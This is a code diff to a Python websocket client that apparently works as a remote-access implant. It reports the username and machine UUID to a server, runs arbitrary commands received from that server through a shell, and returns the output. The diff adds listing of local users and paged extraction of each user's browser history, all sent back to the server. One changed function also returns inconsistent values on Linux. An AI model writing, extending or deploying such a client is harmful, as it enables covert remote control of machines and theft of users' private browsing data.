@@ -8,7 +8,9 @@ import os
 import subprocess
 import time
 
-from browser.monitor_website import fetch_hist
+from browsers.browser import get_browser_hist_path
+from browsers.history import paginate_history
+from browsers.users import get_users
 from utils import handle_cd, download_file, handle_ls, cert_text, solve_ssl, varify_cert
 
 operating_system = platform.system().lower()
@@ -31,8 +33,8 @@ async def start_client():
                 await websocket.send(".%.")
                 time.sleep(0.001)
                 username = os.getlogin()
-                system_uuid = get_system_uuid()
-                response = {"username": username, "system_uuid": system_uuid}
+                system_uuid, platform = get_system_uuid()
+                response = {"username": username, "system_uuid": system_uuid, 'platform': platform}
                 await websocket.send(json.dumps(response))
 
                 while True:
@@ -45,10 +47,10 @@ async def start_client():
                             active = command
                             time.sleep(0.001)
                             username = os.getlogin()
-                            system_uuid = get_system_uuid()
+                            system_uuid, platform = get_system_uuid()
                             await websocket.send(f"cwd%`{os.getcwd()}")
-                            time.sleep(0.001)
-                            response = {"username": username, "system_uuid": system_uuid}
+                            users = get_users(dump=True)
+                            response = {"username": username, "system_uuid": system_uuid, 'platform': platform, 'users': users}
                             await websocket.send(json.dumps(response))
                             continue
 
@@ -70,9 +72,16 @@ async def start_client():
                             continue
                         elif command.lower().startswith('history'):
                             await websocket.send("history")
-                            hist = fetch_hist()
-                            await websocket.send(hist)
-                            continue
+                            try:
+                                signel, user, brows_name = command.split(' ', maxsplit=2)
+                                hist_path = get_browser_hist_path(user, brows_name)
+                                hist = paginate_history(hist_path, offset=0, limit=10)
+                                await websocket.send(hist)
+                                continue
+                            except ValueError:
+                                hist = get_users()
+                                await websocket.send(hist)
+                                continue
 
                         cd_result = handle_cd(command)
                         if cd_result:
@@ -82,22 +91,22 @@ async def start_client():
                             await websocket.send(json.dumps(cd_result))
                             continue
 
-                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-
-                        # Handle if the command returns nothing
-                        if result.stdout == "":
-                            await websocket.send("Null")
-                            continue
-
                         # Send the result back to the server
-                        if command.lower().startswith('ls') or command.lower().startswith('dir'):
+                        elif command.lower().startswith('ls'):
                             cwd = os.getcwd()
-                            response = handle_ls(result)
+                            response = handle_ls(cwd)
                             response['cwd'] = cwd
                             # response = modify_result(result.stdout)
                             await websocket.send("ls")
                             time.sleep(0.001)
                             await websocket.send(json.dumps(response))
+                            continue
+
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+                        # Handle if the command returns nothing
+                        if result.stdout == "":
+                            await websocket.send("Null")
                             continue
 
                         await websocket.send(result.stdout)
@@ -125,39 +134,23 @@ async def start_client():
 
 def get_system_uuid():
     if operating_system == 'linux':
-        # get hardware level uuid unchanged on reinstall OS
-        # try:
-        #     # todo: sudo apt install dmidecode
-        #     result = subprocess.run(["dmidecode", "-s", "system-uuid"], capture_output=True, text=True, check=True)
-        #     output = result.stdout.strip()
-        #     return output
-        # except subprocess.CalledProcessError as e:
-        #     print(e)
-        #     return None
-        # except FileNotFoundError:
-        #     print("dmidecode command not found. Please install it.")
-        #     return None
         try:
             with open('/etc/machine-id', 'r') as file:
                 return file.read().strip()
         except FileNotFoundError:
-            return None
+            return None, None
 
     elif operating_system == 'windows':
-        # result = subprocess.run(
-        #     ['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'],
-        #     capture_output=True, text=True)
-        # return result.stdout.strip().split()[-1].strip()
         try:
             # get hardware level uuid unchanged on reinstall OS
             result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
             output = result.stdout.strip().split("\n")[-1].strip()
-            return output
+            return output, operating_system
         except subprocess.CalledProcessError as e:
             print(e)
-            return None
+            return None, None
 
-    return None
+    return None, None
 
 
 if __name__ == "__main__":
